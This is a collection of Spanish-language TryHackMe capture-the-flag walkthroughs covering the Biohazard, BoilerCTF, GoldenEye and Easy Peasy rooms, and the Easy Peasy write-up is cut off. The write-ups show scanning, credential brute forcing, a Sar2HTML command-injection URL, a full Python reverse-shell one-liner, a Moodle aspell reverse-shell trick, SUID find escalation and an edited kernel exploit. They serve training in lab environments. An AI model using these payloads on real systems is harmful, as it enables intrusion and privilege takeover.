root@upset:~/thm/biohazard/tmp# ftp biohazard.thm Connected to biohazard.thm. 220 (vsFTPd 3.0.3) Name (biohazard.thm:root): hunter 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 1002 1002 4096 Sep 20 2019 . drwxrwxrwx 2 1002 1002 4096 Sep 20 2019 .. -rw-r--r-- 1 0 0 7994 Sep 19 2019 001-key.jpg -rw-r--r-- 1 0 0 2210 Sep 19 2019 002-key.jpg -rw-r--r-- 1 0 0 2146 Sep 19 2019 003-key.jpg -rw-r--r-- 1 0 0 121 Sep 19 2019 helmet_key.txt.gpg -rw-r--r-- 1 0 0 170 Sep 20 2019 important.txt 226 Directory send OK. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory 1 2 3 4 5 6 7 8 9 #important.txt Jill, I think the helmet key is inside the text file, but I have no clue on decrypting stuff. Also, I come across a /hidden_closet/ door but it was locked. From, Barry En una de las imagenes encontramos un archivo incrustado, pero al extraerlo y decodificarlo este no esta completo y seguramente el resto del mensaje esta en las imagenes restantes.\nEn la segunda imagen utilizamos strings y en la tercera binwalk para encontrar el mensaje restante.\n1 2 3 4 5 6 7 8 9 10 root@upset:~/thm/biohazard/tmp# binwalk -e 003-key.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 1930 0x78A Zip archive data, at least v2.0 to extract, uncompressed size: 14, name: key-003.txt 2124 0x84C End of Zip archive, footer length: 22 root@upset:~/thm/biohazard/tmp# cat _003-key.jpg.extracted/key-003.txt 3aXRoX3Zqb2x0 root@upset:~/thm/biohazard/tmp# Utilizamos CyberCheff para obtener el mensaje completo, para obtener el mensaje en el archivo gpg.\nUtilizamos el mensaje o frase para obtener el mensaje, en donde encontramos la \u0026ldquo;flag\u0026rdquo; Helmet Key.\nUtilizamos la \u0026ldquo;flag\u0026rdquo; en /studyRoom/ el cual nos redirige hacia una nueva pagina y donde encontramos un archivo tar, el contenido de este es un archivo de texto con un nombre de usuario.\nEn /hidden_closet/ tambien nos pedia el Helmet Key al ingresarlo encontramos una pagina donde vemos dos archivos de texto. El primer archivo contiene un mensaje codificado.\n1 2 #MO_DISK1.txt wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk En el segundo archivo encontramos una contraseña para SSH.\nSSH - UMBRELLA_GUEST/WEASKER Utilizamos las credenciales que encontramos y logramos obtener una shell con usuario umbrella_guest.\nDentro de la maquina encontramos una nota donde vemos una comversacion entre Jill y Chris, donde mencionan el disco (archivo) MO_DISK1.txt además una posible llave para el contenido de este y que esta cifrado. Utilizamos CyberCheff para obtener el mensaje que contiene la contraseña del usuario Weasker.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion viendo el archivo .history_bash y vemos que este usuario realizo el comando sudo su, utilizamos su contraseña para verificar que no sea la misma para el usuario root y efectivamente es esa. Logramos obtener una shell root y la flag root.txt.\nFAIL Por alguna razon no logramos encontrar la flag Emblem, pero esta se encuentra en diningRoom.\n","description":"Biohazard es una maquina de TryHackMe, enfocada a la tematica de Resident Evil presenta una serie de retos que permitieron el acceso a la maquina. Escalamos privilegios utilizando sudo.","id":110,"section":"posts","tags":["cyberchef","vigenere","ftp","steganography","steghide","binwalk"],"title":"TryHackMe - Biohazard","uri":"https://sckull.github.io/posts/biohazard/"},{"content":"\rBoilerCTF es una maquina de TryHackMe, la herramienta para trazar estadisticas Sar2HTML tiene una vulnerabilidad RCE la cual explotamos para obtener una shell. En el movimiento lateral encontramos contraseñas en el log de acceso de SSH del usuario Basterd. Nuevamente obtuvimos acceso a otro usuario con una contraseña almacenada. Finalmente encontramos un fichero con permisos SUID la cual nos dio acceso privilegiado.\nRoom Titulo Boiler CTF Descripción Intermediate level CTF Puntos 650 Dificultad Media Maker MrSeth6797 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), Webmin (10000) y el puerto ssh (55007) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Nmap 7.80 scan initiated Tue Aug 11 21:20:00 2020 as: nmap -sV -o mini_scan boiler.thm Nmap scan report for boiler.thm (10.10.29.145) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 10000/tcp open http MiniServ 1.930 (Webmin httpd) 55007/tcp open unknown Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 11 21:21:19 2020 -- 1 IP address (1 host up) scanned in 78.77 seconds Para verificar SSH en el puerto 55007 utilizamos netcat.\n1 2 3 root@upset:~/thm/boilerctf# nc boiler.thm 55007 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8 ^C FTP Ingresamos en el servicio FTP con las credenciales anonymous, encontramos un archivo que contiene un mensaje cifrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 root@upset:~/thm/boilerctf# ftp boiler.thm Connected to boiler.thm. 220 (vsFTPd 3.0.3) Name (boiler.thm:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Aug 22 2019 . drwxr-xr-x 2 ftp ftp 4096 Aug 22 2019 .. -rw-r--r-- 1 ftp ftp 74 Aug 21 2019 .info.txt 226 Directory send OK. ftp\u0026gt; get .info.txt local: .info.txt remote: .info.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .info.txt (74 bytes). 226 Transfer complete. 74 bytes received in 0.00 secs (802.9514 kB/s) ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; quit 221 Goodbye. root@upset:~/thm/boilerctf# cat .info.txt Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl! root@upset:~/thm/boilerctf# Utilizamos dcode.fr para obtener el mensaje, pero no ayudo mucho.\nHTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 root@upset:~/thm/boilerctf# gobuster dir -u http://boiler.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /joomla (Status: 301) /manual (Status: 301) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) En robots.txt encontramos varias direcciones \u0026ldquo;escondidas\u0026rdquo;, además de eso un mensaje \u0026ldquo;codificado\u0026rdquo;.\nUtilizamos ASCII to text para obtener un nueva cadena codificada.\nUtilizamos CyberChef para decodificar la cadena.\nUtilizamos CrackStation para obtener el mensaje que no sirve de mucho.\nGOBUSTER - JOOMLA Pagina en Joomla.\nUtilizamos gobuster para busqueda de directorios y archivos en /joomla.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 root@upset:~/thm/boilerctf# gobuster dir -u http://boiler.thm/joomla/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /_files (Status: 301) /_test (Status: 301) /~www (Status: 301) /administrator (Status: 301) /bin (Status: 301) /build (Status: 301) /cache (Status: 301) /components (Status: 301) /configuration.php (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /installation (Status: 301) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /LICENSE.txt (Status: 200) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /README.txt (Status: 200) /templates (Status: 301) /tests (Status: 301) /tmp (Status: 301) /web.config.txt (Status: 200) En /_files encontramos una cadena codificada.\nUtilizamos CyberChef para decodificar la cadena y encontramos un posible nombre de usuario.\nEn /_database encontramos una cadena cifrada.\nUtilizamos dcode.fr para decifrar el mensaje pero no sirvio de nada.\nSar2HTML - RCE En /_test encontramos Sar2HTML al buscar una vulnerabilidad en este software encontramos que podemos ejecutar comandos en la maquina. Para ello debemos de seleccionar el Sistema Operativo (OS) y en la URL _test/index.php?plot=;COMANDO colocamos nuestro comando a ejecutar y al final del dropdown en Select Host encontramos el resultado de nuestro comando ejecutado. Ejecutamos id.\nEjecutamos ls -lah y tambien logramos ver el resultado, donde vemos el archivo log.txt.\nHacemos cat al archivo, utilizamos CyberChef - Strip HTML tags para leer el html que se muestra y obtener el resultado limpio.\nUSER - WWW-DATA/BASTERD Encontramos en el archivo un log de acceso del servicio SSH donde se muestra el usuario basterd y su \u0026ldquo;contraseña\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 Select HostHPUXLinuxSunOS Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22. Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: [... REDACTED ...] Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0) Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824 Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating. Select Host FirstSelect Start Date First\tEjecutamos una shell inversa y obtenemos una shell con el usuario www-data.\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; Además utilizamos la contraseña que encontramos en el servicio SSH y obtenemos una shell con el usuario basterd.\nUSER - STONER En la carpeta principal de basterd encontramos un archivo que realiza una copia a /usr/local/backup y log en /home/stoner/bck.log de todo lo que existe en /home/stoner, además encontramos lo que parece ser una \u0026ldquo;contraseña\u0026rdquo; comentada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 REMOTE=1.2.3.4 SOURCE=/home/stoner TARGET=/usr/local/backup LOG=/home/stoner/bck.log DATE=`date +%y\\.%m\\.%d\\.` USER=stoner #[... REDACTED ...] ssh $USER@$REMOTE mkdir $TARGET/$DATE if [ -d \u0026#34;$SOURCE\u0026#34; ]; then for i in `ls $SOURCE | grep \u0026#39;data\u0026#39;`;do echo \u0026#34;Begining copy of\u0026#34; $i \u0026gt;\u0026gt; $LOG scp $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE echo $i \u0026#34;completed\u0026#34; \u0026gt;\u0026gt; $LOG if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2\u0026gt;/dev/null` ];then rm $SOURCE/$i echo $i \u0026#34;removed\u0026#34; \u0026gt;\u0026gt; $LOG echo \u0026#34;####################\u0026#34; \u0026gt;\u0026gt; $LOG else echo \u0026#34;Copy not complete\u0026#34; \u0026gt;\u0026gt; $LOG exit 0 fi done else echo \u0026#34;Directory is not present\u0026#34; \u0026gt;\u0026gt; $LOG exit 0 fi Utilizamos la \u0026ldquo;contraseña\u0026rdquo; y logramos obtener una shell con el usuario stoner y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con find para encontrar archivos con permisos SUID y vemos el comando/archivo find. Utilizamos find para obtener una shell root.\n1 /usr/bin/find . -exec /bin/sh -p \\; -quit Obtenemos una shell con el usuario root.\nY nuestra flag root.txt.\n","description":"BoilerCTF es una maquina de TryHackMe, la herramienta para trazar estadisticas Sar2HTML tiene una vulnerabilidad RCE la cual explotamos para obtener una shell. En el movimiento lateral encontramos contraseñas en el log de acceso de SSH del usuario Basterd. Nuevamente obtuvimos acceso a otro usuario con una contraseña almacenada. Finalmente encontramos un fichero con permisos SUID la cual nos dio acceso privilegiado.","id":111,"section":"posts","tags":["ftp","vigenere","Sar2HTML","suid","ctf like"],"title":"TryHackMe - BoilerCTF","uri":"https://sckull.github.io/posts/boilerctf/"},{"content":"\rGoldenEye es una maquina de TryHackMe, enfocada en la tematica de Golden Eye encontramos multiples usuarios los cuales utilizamos con Hydra en POP3 donde obtuvimos acceso y credenciales para Moodle que posteriormente nos devolvio a POP3 donde encontramos credenciales de administracion para Moodle donde luego explotamos una vulnerabilidad para obtener acceso. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.\nRoom Titulo GoldenEye Descripción Bond, James Bond. A guided CTF. Puntos 930 Dificultad Media Maker ben GOLDENEYE PART 1 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80). ssl (55006), pop3 (55007) y el puerto smtp (25) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # Nmap 7.80 scan initiated Wed Aug 5 17:03:08 2020 as: nmap -sV -o mini_scan golden.thm Nmap scan report for golden.thm (10.10.38.197) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 17:03:58 2020 -- 1 IP address (1 host up) scanned in 50.07 seconds # Nmap 7.80 scan initiated Wed Aug 5 17:02:54 2020 as: nmap -sV -p- -T5 -o big_scan golden.thm Warning: 10.10.38.197 giving up on port because retransmission cap hit (2). Nmap scan report for golden.thm (10.10.38.197) Host is up (0.25s latency). Not shown: 65449 closed ports, 82 filtered ports PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 55006/tcp open ssl/unknown 55007/tcp open pop3 Dovecot pop3d Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 17:16:03 2020 -- 1 IP address (1 host up) scanned in 789.07 seconds HTTP Encontramos una pagina web en el puerto 80, en donde mencionan un directorio /sev-home/.\nEn el codigo del script que se ejecuta en la pagina encontramos un posible nombre de usuario y contraseña, en el comentario tambien indica que la contraseña esta codificada.\nUtilizamos CyberChef para obtener en texto plano la contraseña.\nEn el directorio /sev-home/ encontramos un panel simple de logeo.\nAl ingresar con las credenciales que encontramos nos muestra un video con contenido en la pagina.\nEn uno de los parrafos muestra el siguiente mensaje, en el que indican que devemos de enviar un correo a un supervisor calificado, y que el servicio de pop3 esta configurado en un puerto alto que seria el 55007:\n1 2 3 4 5 6 7 Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port Además en el codigo fuente de la pagina encontramos otro posible nombre de usuario junto a otro que ya encontramos y que son \u0026ldquo;supervisores\u0026rdquo;.\nRUSTBUSTER/GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en el directorio principal (/).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2020-08-05 17:13:55 GET\t200 OK\thttp://golden.thm/ GET 403 Forbidden http://golden.thm/.php GET 403 Forbidden http://golden.thm/.html GET 403 Forbidden http://golden.thm/.hta GET 403 Forbidden http://golden.thm/.hta.php GET 403 Forbidden http://golden.thm/.hta.html GET 403 Forbidden http://golden.thm/.hta.txt GET 403 Forbidden http://golden.thm/.htaccess GET 403 Forbidden http://golden.thm/.htaccess.php GET 403 Forbidden http://golden.thm/.htaccess.html GET 403 Forbidden http://golden.thm/.htaccess.txt GET 403 Forbidden http://golden.thm/.htpasswd GET 403 Forbidden http://golden.thm/.htpasswd.php GET 403 Forbidden http://golden.thm/.htpasswd.html GET 403 Forbidden http://golden.thm/.htpasswd.txt GET 200 OK http://golden.thm/index.html GET 200 OK http://golden.thm/index.html GET 403 Forbidden http://golden.thm/server-status [00:03:25] ######################################## 18444/18444 ETA: 00:00:00 req/s: 89 [?] Ended at: 2020-08-05 17:17:20 Utilizando GOBUSTER con las credenciales realizamos una busqueda de paginas y directorios en /sev-home/ pero no encontramos nada interesante.\nroot@upset:~/thm/goldeneye# gobuster dir -u http://golden.thm/sev-home/ -w /usr/share/wordlists/dirb/common.txt -P [... REDACTED ...] -U boris -q -t 50 -x php,html,txt\r/index.html (Status: 200)\r/index.html (Status: 200) POP3 - HYDRA Intentamos reutilizar la contraseña junto con los usuarios que encontramos en este servicio pero no funcionaron, por lo que utilizamos hydra para hacer un ataque de fuerza bruta junto con los usuarios y el wordlist rockyou.\nDespues de realizar mas de diez mil intentos no encontramos alguna contraseña (raro en una maquina de THM) con el wordlist rockyou cambiamos de wordlist a uno más pequeño, con el cual encontramos credenciales para los usuarios boris y natalya.\nBORIS - EMAIL Utilizamos las credenciales para leer los correos de boris al igual que en Fowsniff CTF - THM, encontramos otros usuarios xenia y alec. En los correos hablan sobre codigos de boris, estos codigos natalya ha podido romper. Tambien sobre un archivo escondido en el servidor.\ncorreo1\rcorreo2\rcorreo3\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 RETR 1 +OK 544 octets Return-Path: \u0026lt;root@127.0.0.1.goldeneye\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id D9E47454B1 for \u0026lt;boris\u0026gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT) Message-Id: \u0026lt;20180425022326.D9E47454B1@ubuntu\u0026gt; Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT) From: root@127.0.0.1.goldeneye Boris, this is admin. You can electronically communicate to co-workers and students here. I\u0026#39;m not going to scan emails for security risks because I trust you and the other admins here. . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 RETR 2 +OK 373 octets Return-Path: \u0026lt;natalya@ubuntu\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id C3F2B454B1 for \u0026lt;boris\u0026gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT) Message-Id: \u0026lt;20180425024249.C3F2B454B1@ubuntu\u0026gt; Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT) From: natalya@ubuntu Boris, I can break your codes! . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 RETR 3 +OK 921 octets Return-Path: \u0026lt;alec@janus.boss\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from janus (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id 4B9F4454B1 for \u0026lt;boris\u0026gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT) Message-Id: \u0026lt;20180425025235.4B9F4454B1@ubuntu\u0026gt; Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT) From: alec@janus.boss Boris, Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn! Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages.... PS - Keep security tight or we will be compromised. . NATALYA - EMAIL Utilizamos neuvamente telnet pero esta vez con las credenciales de natalya, encontramos en uno de los correos las credenciales del usuario xenia.\ncorreo1\rcorreo2\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 RETR 1 +OK 631 octets Return-Path: \u0026lt;root@ubuntu\u0026gt; X-Original-To: natalya Delivered-To: natalya@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id D5EDA454B1 for \u0026lt;natalya\u0026gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT) Message-Id: \u0026lt;20180425024542.D5EDA454B1@ubuntu\u0026gt; Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT) From: root@ubuntu Natalya, please you need to stop breaking boris\u0026#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you. Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus. . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 RETR 2 +OK 1048 octets Return-Path: \u0026lt;root@ubuntu\u0026gt; X-Original-To: natalya Delivered-To: natalya@ubuntu Received: from root (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id 17C96454B1 for \u0026lt;natalya\u0026gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT) Message-Id: \u0026lt;20180425031956.17C96454B1@ubuntu\u0026gt; Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT) From: root@ubuntu Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it\u0026#39;s related to security...even if it\u0026#39;s not, just enter it in under the guise of \u0026#34;security\u0026#34;...it\u0026#39;ll get the change order escalated without much hassle :) Ok, user creds are: username: xenia password: [... REDACTED ...] Boris verified her as a valid contractor so just create the account ok? And if you didn\u0026#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir **Make sure to edit your host file since you usually work remote off-network.... Since you\u0026#39;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts. . GOLDENEYE PART 2 Agregamos el siguiente dominio severnaya-station.com a nuestro archiv /etc/hosts junto a la IP de la maquina, y nos dirigimos a /gnocertdir. Encontramos lo que parece ser la plataforma Moodle.\nUtilizamos las credenciales de xenia para ingresar. En los mensajes de xenia encontramos un mensaje de doak (nuevo nombre de usuario) en donde habla sobre un curso en el que xenia esta involucrada.\nDOAK - HYDRA -\u0026gt; POP3 Nuevamente utilizamos hydra con el usuario doak en el puerto de pop3 (55007). Logramos obtener su contraseña.\nAl revisar uno de sus correos encontramos su usario y contraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 RETR 1 +OK 606 octets Return-Path: \u0026lt;doak@ubuntu\u0026gt; X-Original-To: doak Delivered-To: doak@ubuntu Received: from doak (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id 97DC24549D for \u0026lt;doak\u0026gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT) Message-Id: \u0026lt;20180425034731.97DC24549D@ubuntu\u0026gt; Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT) From: doak@ubuntu James, If you\u0026#39;re reading this, congrats you\u0026#39;ve gotten this far. You know how tradecraft works right? Because I don\u0026#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information...... username: dr_doak password: [... REDACTED ...] . ADMIN - MOODLE Utilizamos las credenciales de doak en moodle. Encontramos un archivo que contiene una direccion a una imagen, que segun el mensaje ahi se encuentran las credenciales del usuario admin.\nDescargamos la imagen y al analizarla con exiftool encontramos una cadena de texto codificada en base64.\nUtilizamos la \u0026ldquo;contraseña\u0026rdquo; que encontramos en moodle con el usuario admin y logramos obtener acceso.\nWWW-DATA - USER Dentro de moodle agregamos una shell inversa en la configuracion del PATH de ASPELL.\nTambien configuramos el parametro del plugin TinyMCE a PSpellShell.\nPusimos a la escucha netcat, creamos una nueva entrada de blog donde vemos la opcion de spell, que al presionar el boton, se ejecuta nuestra shell.\nLogramos obtener una shell con el usuario www-data.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con uname -a y vemos la version del kernel, al revisar si existe un exploit encontramos Linux Kernel 3.13.0 - Local Privilege Escalation, el cual descargamos y ejecutamos en la maquina, pero nos dio un error y es que gcc no está instalado en la maquina.\nPor lo que buscamos alternativas a gcc y encontramos clang, el cual si esta instalado en la maquina. Editamos el exploit cambiando gcc por clang, descargamos, ejecutamos el exploit en la maquina y logramos obtener una shell con usuario root.\ngcc a clang.\n1 2 -lib = system(\u0026#34;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w\u0026#34;); +lib = system(\u0026#34;clang -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w\u0026#34;); Y nuestra flag root.txt.\n","description":"GoldenEye es una maquina de TryHackMe, enfocada en la tematica de Golden Eye encontramos multiples usuarios los cuales utilizamos con Hydra en POP3 donde obtuvimos acceso y credenciales para Moodle que posteriormente nos devolvio a POP3 donde encontramos credenciales de administracion para Moodle donde luego explotamos una vulnerabilidad para obtener acceso. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.","id":112,"section":"posts","tags":["pop3","hydra","pop3","moodle"],"title":"TryHackMe - GoldenEye","uri":"https://sckull.github.io/posts/goldeneye/"},{"content":"\rEasy Peasy es una maquina de TryHackMe, presenta retos de Esteganografia y Crackeo de hashes para obtener user. Un CronJob permitio obtener acceso privilegiado.\nRoom Titulo Easy Peasy Descripción Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob. Puntos 630 Dificultad Facil Maker kral4 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ssh (6498) y http (65524) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # Nmap 7.80 scan initiated Wed Aug 5 01:17:20 2020 as: nmap -p- -T4 -o nmap_scan -v easy.thm Increasing send delay for 10.10.162.162 from 0 to 5 due to 21 out of 52 dropped probes since last increase. Nmap scan report for easy.thm (10.10.162.162) Host is up (0.26s latency). Not shown: 65532 closed ports PORT STATE SERVICE 80/tcp open http 6498/tcp open unknown 65524/tcp open unknown Read data files from: /usr/bin/../share/nmap # Nmap done at Wed Aug 5 01:39:35 2020 -- 1 IP address (1 host up) scanned in 1335.29 seconds # Nmap 7.80 scan initiated Wed Aug 5 01:46:14 2020 as: nmap -sV -p 80,6498,65524 -o services_scan easy.thm Nmap scan report for easy.thm (10.10.162.162) Host is up (0.29s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.16.1 6498/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 65524/tcp open http Apache httpd 2.4.43 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 01:46:30 2020 -- 1 IP address (1 host up) scanned in 15.45 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 root@upset:~/thm/easypeasy gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://easy.thm/ -q -t 250 -x php,html,txt /index.html (Status: 200) /robots.txt (Status: 200) /hidden (Status: 301) Encontramos el archivo robots.txt el cual no contiene ninguna url excluida, tambien la pagina hidden donde encontramos una imagen de fondo.\nEjecutamos nuevamente RUSTUBUSTER pero ahora en el directorio/pagina hidden.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 root@upset:~/thm/easypeasy /opt/rustbuster/rustbuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://easy.thm/hidden/ -t 155 -e php,html,txt -o out_hidden.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ 